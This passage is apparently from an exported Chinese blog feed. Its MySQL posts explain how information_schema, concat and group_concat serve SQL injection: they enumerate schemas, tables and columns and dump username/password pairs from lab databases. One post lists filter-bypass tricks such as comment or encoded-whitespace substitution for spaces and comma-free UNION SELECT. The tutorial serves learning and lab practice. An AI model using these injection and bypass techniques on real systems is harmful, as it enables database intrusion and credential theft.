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" alt>

<p> </p>
<p>information_schema数据库是MySQL系统自带的数据库，它提供了数据库元数据的访问方式。感觉information_schema就像是MySQL实例的一个百科全书，记录了数据库当中大部分我们需要了结的信息，比如字符集，权限相关，数据库实体对象信息，外检约束，分区，压缩表，表信息，索引信息，参数，优化，锁和事物等等。通过information_schema我们可以窥透整个MySQL实例的运行情况，可以了结MySQL实例的基本信息，甚至优化调优，维护数据库等，information_schema数据库是在mysql的版本5.0之后产生的，一个虚拟数据库，物理上并不存在。</p>
<p> </p>
<p>在注入过程中经常会用到这个库，前提是MySQL版本在5.0之后，在注入中用version()函数查看mysql版本</p>
<p> </p>
<p>在这个库里面有会用到这些表</p>
<p><strong>SCHEMATA:　　 提供了当前mysql数据库中所有数据库的信息,其中SCHEMA_NAME字段保存了所有的数据库名.show databases的结果取自此表.</strong></p>
<p>可以直接 　　select * from schemata;</p>
<p>或者 　　select schema_name from schemata;</p>
<p>来查看所有库名；</p>
<img src="1503868-20200815104455770-1590822220.png" width="1000" loading="lazy">

<p> 在实际中还是用第二个搭配上group_concat()，</p>
<p>如  　　select group_concat(schema_name) from schemata;</p>
<p> <img src="1503868-20200815104724706-573372640.png" alt loading="lazy"></p>
<p> <br><strong>TABLES:　　　　提供了关于数据库中的表的信息,详细表述了某个表属于哪个schema,表类型,表引擎,创建时间等信息,其中table_name字段保存了所有列名信息,show tables from schemaname的结果取自此表.</strong></p>
<p>例如select group_concat(table_name) from information_schema.tables;</p>
 <img src="1503868-20200815154557805-1967623025.png" width="1000" loading="lazy">

<p> </p>
<p><strong>COLUMNS:　　   提供了表中的列信息.详细表述了某张表的所有列以及每个列的信息,其中column_name保存了所有的字段信息.show columns from schemaname.tablename的结果取自此表.</strong></p>
<p> 例如select group_concat(column_name) from information_schema.columns;</p>
<img src="1503868-20200815154535286-493998666.png" width="1000" loading="lazy">

<p> 一般在使用information_schema表的时候，都要用where选则需要的那个表，不然数据量太大</p>
<p>举个例子</p>
<p>得到表名：　　select group_concat(table_name) from information_schema.tables where table_schema=database();</p>
<p>得到字段名：　select group_concat(column_name) from information_schema.columns where table_name=xxx;</p>
<p>得到数据：　　select group_concatusername,passward,xxx,…………) from xxx;<br> </p>
<p> </p>
<p> </p>
<p> </p>
<p>select group_concat(column_name) from information_schema.columns;</p>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title>mysql下的information与concat</title>
    <url>/2021/01/09/mysql%E4%B8%8B%E7%9A%84information%E4%B8%8Econcat-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/14257025.html">源地址：https://www.cnblogs.com/This-is-Y/p/14257025.html<i class="fas fa-external-link-alt"></i></a></p>
<p>use information_schema;<br>show tables;</p>
<p>可以看到很多表</p>
<img src="1503868-20210109155625511-2101199464.png" alt loading="lazy">

<p> </p>
<p> </p>
<p>在注入的时候，有用的表是tables，columns</p>
<p>这两个表存了整个mysql数据库中的表的信息，列的信息</p>
<p>看一下两个表中的信息</p>
<p>TABLES:</p>
<img src="1503868-20210109160504772-1430230246.png" alt loading="lazy">

<p>在注入过程中只需要关注两条，table_name 和table_schema，table_name是所有表的表名，table_schema是数据库的名字，</p>
<p>比如在jsp表下有很多表</p>
<img src="1503868-20210109163645243-1260669876.png" alt loading="lazy">

<p> </p>
<p>查找tables表中，当table_schema=jsp时的table_name，可以看到和use jsp;show tables;指令执行的结果一致</p>
<p>通俗的说法就是 <strong>看看jsp数据库下面有哪些数据表</strong></p>
<p> </p>
<p> <img src="1503868-20210109163820630-1425639579.png" alt loading="lazy"></p>
<p> </p>
<p> </p>
<p> 或者反过来查， select table_schema from information_schema.tables where table_name=”c_programming”;</p>
<p>查找当table_name=“c_programming”时，有哪些数据库，通俗点说就是，<strong>看看哪些数据库下面有一个叫做“c_programming”的数据表。</strong></p>
<img src="1503868-20210109164147702-421909970.png" alt loading="lazy">

<p> </p>
<p> </p>
<p> </p>
<p> </p>
<p>COLUMNS:</p>
<p> <img src="1503868-20210109160537844-284579978.png" alt loading="lazy"></p>
<p> </p>
<p> </p>
<p> 这个视图下也有table_schema,table_name，还有一个column_name</p>
<p>可以看一下column_name，举个例子，看一下jsp表下的c_programming的信息</p>
<img src="1503868-20210109165317022-57953845.png" alt loading="lazy">

<p> </p>
<p> </p>
<p> 列名分别为number，content,a,b…………</p>
<p>执行select column_name from information_schema.columns where table_schema=”jsp” and table_name=”c_programming”;</p>
<p>这个是查看 jsp库下c_programming表的字段信息，</p>
<img src="1503868-20210109165506744-1652508213.png" alt loading="lazy">

<p> </p>
<p> </p>
<p> 一致</p>
<p> </p>
<p>所以可以直接用information_schema.colums表，重点为其中的table_name，column_name，table_schema几个字段，可以很快的得到需要的信息</p>
<p> </p>
<p> </p>
<p>之后是concat和group_concat</p>
<p> concat可以把字段拼接起来，group_concat可以把每一条数据拼接起来（前提是知道字段名）</p>
<p>首先看一个表：</p>
<img src="1503868-20210109170055579-1165692189.png" alt loading="lazy">

<p> </p>
<p> select concat(username,password) from admin.admin;</p>
<img src="1503868-20210109170226921-15950402.png" alt loading="lazy">

<p> </p>
<p> </p>
<p> 或者是加点其他的字符，方便区分 select concat(username,” + “,password) from admin.admin;</p>
<img src="1503868-20210109170358985-343402019.png" alt loading="lazy">

<p> </p>
<p> </p>
<p> </p>
<p> select group_concat(username,” + “,password) from admin.admin;</p>
<img src="1503868-20210109170420436-186918281.png" alt loading="lazy">

<p> </p>
<p> </p>
<p> group_concat也可以加点东西区分，默认是一个”,”，在group_concat()里加一个separator参数（不要逗号）</p>
<p>举个栗子：select group_concat(username,” + “,password separator ‘;’) from admin.admin;</p>
<img src="1503868-20210109171517115-1892978071.png" alt loading="lazy">

<p> </p>
<p> </p>
<p> </p>
<p> </p>
<p> </p>
<p>然后来尝试用information_schema来获取admin所有的信息，</p>
<p>　　</p>
<p><strong>1、</strong></p>
<p>select database();确认数据库名</p>
<p>　　<img src="1503868-20210109172154974-2106922817.png" alt></p>
<p>select version();确认mysql版本</p>
<p>　　<img src="1503868-20210109172214468-120839495.png" alt loading="lazy"></p>
<p> </p>
<p> </p>
<p> </p>
<p><strong>2、</strong></p>
<p>select distinct table_schema from information_schema.columns;查看所有的库名，实战中估计会要用到group_concat</p>
<img src="1503868-20210109231628046-2130437122.png" alt loading="lazy">

<p> </p>
<p>select  group_concat(distinct table_schema) from information_schema.columns;</p>
<p> </p>
<p> <img src="1503868-20210109231638336-1097832532.png" alt loading="lazy"></p>
<p> </p>
<p> </p>
<p><strong>3、</strong></p>
<p> </p>
<p> select group_concat(distinct table_name) from information_schema.columns where table_schema=”admin”; 查看该库下的表</p>
<img src="1503868-20210109231925074-269336087.png" alt loading="lazy">

<p> </p>
<p> </p>
<p> select group_concat(distinct table_name) from information_schema.columns where table_schema=”security”;</p>
<img src="1503868-20210109232028383-1712345336.png" alt loading="lazy">

<p> </p>
<p> </p>
<p> </p>
<p><strong>4、</strong></p>
<p>select group_concat(column_name) from information_schema.columns where table_schema=”security” and table_name=”users”;查看该表的字段名</p>
<img src="1503868-20210109232212707-1594846497.png" alt loading="lazy">

<p> </p>
<p> </p>
<p> select group_concat(column_name) from information_schema.columns where table_schema=”admin” and table_name=”admin”;</p>
<img src="1503868-20210109232358074-130089249.png" alt loading="lazy">

<p> </p>
<p> </p>
<p><strong>5、</strong></p>
<p> </p>
<p> </p>
<p>select group_concat(id,” = “,username,” = “,password separator “\n”) from security.users;爆数据</p>
<img src="1503868-20210109232747906-2138412943.png" alt loading="lazy">

<p> </p>
<p>  select group_concat(username,” = “,password separator “\n”) from admin.admin;</p>
<img src="1503868-20210109232813349-883336675.png" alt loading="lazy">

<p> </p>
<p> </p>
<p> </p>
<p> </p>
<p> </p>
<p> </p>
<p>c_programming</p>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title>mysql只能显示部分中文问题 解决</title>
    <url>/2020/09/27/mysql%E5%8F%AA%E8%83%BD%E6%98%BE%E7%A4%BA%E9%83%A8%E5%88%86%E4%B8%AD%E6%96%87%E9%97%AE%E9%A2%98%20%E8%A7%A3%E5%86%B3-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13738043.html">源地址：https://www.cnblogs.com/This-is-Y/p/13738043.html<i class="fas fa-external-link-alt"></i></a></p>
<p>我是用的phpstudy2018一键配置的mysql</p>
<p>mysql版本为5.5.53</p>
<img src="1503868-20200927102048827-1931693713.png" alt loading="lazy">

<p> </p>
<p> </p>
<p> </p>
<p>问题描述：</p>
<p>show variables like “%char%”;</p>
<img src="1503868-20200927101315246-300698320.png" width="1000" loading="lazy">

<p> </p>
<p> </p>
<p> 建表语句：</p>
<p>create table student(<br>    Sno int(20),<br>    Sname char(20),<br>    Ssex char(20),<br>    Sage int(10),<br>    Sdept char(20)<br>) character set=utf8;</p>
<p> </p>
<p>插入数据：</p>
<p>insert into student(Sno,Sname,Ssex,Sage,Sdept) value(201215121,’李勇’,’男’,20,’CS’);<br>insert into student(Sno,Sname,Ssex,Sage,Sdept) value(201215122,’刘晨’,’女’,19,’CS’);<br>insert into student(Sno,Sname,Ssex,Sage,Sdept) value(201215123,’王敏’,’女’,18,’MA’);<br>insert into student(Sno,Sname,Ssex,Sage,Sdept) value(201215125,’张立’,’男’,19,’IS’);</p>
<p>然鹅，显示出来的却是。。。。。</p>
<p>只能显示部分中文，不知道是不是叫做乱码</p>
<img src="1503868-20200927101953799-1973169479.png" width="1000" loading="lazy">

<p> </p>
<p> </p>
<p> </p>
<p>解决方法；</p>
<p>打开mysql目录下的my.ini</p>
<p>加入</p>
<p> </p>
<p>[mysqld]<br>character-set-server=utf8<br>collation-server=utf8_general_ci<br>[client]<br>default-character-set=gbk<br>[mysql]<br>default-character-set=gbk</p>
<p> </p>
<img src="1503868-20200927102151290-1842516100.png" alt loading="lazy">

<p> </p>
<p> </p>
<p> 保存，重启mysql服务</p>
<p>不过表中已经保存的数据无法修改回来，只能重新添加</p>
<img src="1503868-20200927102644600-107553228.png" width="1000" loading="lazy">

<p> </p>
<p> </p>
<p> </p>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title>mysql中的concat().concat_ws(),group_concat()</title>
    <url>/2020/08/12/mysql%E4%B8%AD%E7%9A%84concat().concat_ws(),group_concat()-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13491416.html">源地址：https://www.cnblogs.com/This-is-Y/p/13491416.html<i class="fas fa-external-link-alt"></i></a></p>
<p> 简单建立一个表</p>
<img src="1503868-20200812161041473-1504706485.png" alt loading="lazy">

<p> </p>
<p> <strong>concat()</strong></p>
<p>用于连接字符串，举个例子</p>
<p> select concat(id,’-‘,name,’-‘,sex,’-‘) from null_test;</p>
<img src="1503868-20200812161031226-883321634.png" alt loading="lazy">

<p> </p>
<p> 值得注意的是，空字符也算字符（第五条数据），但是如果参数中有null，则整个输出变成null（第三第四条数据）；</p>
<p> </p>
<p><strong>concat_ws()</strong></p>
<p>在数据较少时，用concat()可能不会出现什么问题，但是如果数据量过大，一个一个为其配置分隔符就显得累赘，于是就有了concat_ws(),  CONCAT_WS() 代表 CONCAT With Separator</p>
<p>第一个参数为separator，即分隔符</p>
<p>如果分隔符为NULL，则所有输出都为NULL；</p>
<p>select concat_ws(<strong>NULL</strong>,id,name,sex) from null_test;</p>
<img src="1503868-20200812160011781-86849650.png" alt loading="lazy">

<p> </p>
<p>如果参数中有null，直接跳过后，正常输出 </p>
<p>select concat_ws(‘==’,id,name,sex) from null_test;</p>
<img src="1503868-20200812160114370-1393843926.png" alt loading="lazy">

<p> </p>
<p> </p>
<p><strong>group_concat()</strong></p>
<p>group_concat()像是concat()的加强版，concat()把字符串组合起来，group_concat()把组合后的字符串再组合起来，</p>
<p>select group_concat(id,’-‘,name,’-‘,sex) from null_test;</p>
<img src="1503868-20200812161304728-239534354.png" alt loading="lazy">

<p> </p>
<p> </p>
<p>这三个都可以用as 来修改列名</p>
<p>举个例子</p>
<p>select concat(id,’==’,name) as id_name,concat(name,’==’,’sex’) as name_sex from null_test;</p>
<img src="1503868-20200812163708930-428683991.png" alt loading="lazy">

<p> </p>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title>mysql登陆时出现ERROR 2013 (HY000) Lost connection to MySQL server at &#39;reading initial communication packet&#39;, system error 0</title>
    <url>/2019/07/31/mysql%E7%99%BB%E9%99%86%E6%97%B6%E5%87%BA%E7%8E%B0ERROR%202013%20(HY000)%20Lost%20connection%20to%20MySQL%20server%20at%20&#39;reading%20initial%20communication%20packet&#39;,%20system%20error%200-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/11279689.html">源地址：https://www.cnblogs.com/This-is-Y/p/11279689.html<i class="fas fa-external-link-alt"></i></a></p>
<p> 有4到5天没开mysql，这天晚上打=打开phpstudy，想进去mysql练习练习，结果丢给我这个</p>
<p>ERROR 2013 (HY000): Lost connection to MySQL server at ‘reading initial communication packet’, system error: 0</p>
<p>错误2013 (HY000):读取初始通信包时MySQL服务器连接丢失，系统错误0</p>
<p>windows进cmd命令行，输入server.msc，然后找到mysql的服务，重启一下就好了。</p>
<p>（听说还有更复杂的情况，我又没碰到，关我什么事，碰到了再补上）</p>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title>mysql绕过技巧</title>
    <url>/2021/07/30/mysql%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7-This-is-Y/</url>
    <content><![CDATA[<p>参考：<a class="link" href="https://www.cnblogs.com/yesec/p/12344786.html">https://www.cnblogs.com/yesec/p/12344786.html<i class="fas fa-external-link-alt"></i></a></p>
<h2 id="针对特殊字符限制的绕过"><a href="#针对特殊字符限制的绕过" class="headerlink" title="针对特殊字符限制的绕过"></a>针对特殊字符限制的绕过</h2><h3 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h3><h4 id><a href="#" class="headerlink" title="/**/"></a>/**/</h4><p>SELECT * from emails where id=1<br>SELECT/<strong>/*/</strong>/from/<strong>/emails/</strong>/where/**/id=1</p>
<h4 id="-1"><a href="#-1" class="headerlink" title="()"></a>()</h4><p>括号也可以绕，但不是所有的地方都可以用，<br>select * from emails where(1=1)and(2=2);    √<br>select(*)from()emails()where(1=1)and(2=2);   ×<br>不是很会用</p>
<p>用Tab代替空格%20 %09 %0a %0b %0c %0d %a0 /**/()</p>
<h3 id="逗号-，"><a href="#逗号-，" class="headerlink" title="逗号  ，"></a>逗号  ，</h3><h4 id="使用语法绕过："><a href="#使用语法绕过：" class="headerlink" title="使用语法绕过："></a>使用语法绕过：</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> ((<span class="keyword">SELECT</span> <span class="number">1</span>)a <span class="keyword">JOIN</span> (<span class="keyword">SELECT</span> <span class="number">2</span>)b <span class="keyword">JOIN</span> (<span class="keyword">SELECT</span> <span class="number">3</span>)c);</span><br><span class="line">实际上也就相当于：</span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>;</span><br></pre></td></tr></table></figure>

